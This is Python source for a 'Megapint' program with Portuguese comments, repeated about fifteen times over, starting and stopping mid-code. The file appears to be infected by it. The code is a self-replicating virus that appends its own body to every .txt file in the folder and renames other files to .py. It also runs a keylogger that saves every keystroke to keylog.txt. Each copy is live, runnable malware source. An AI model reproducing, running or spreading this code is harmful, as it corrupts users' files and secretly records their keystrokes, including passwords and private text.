        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
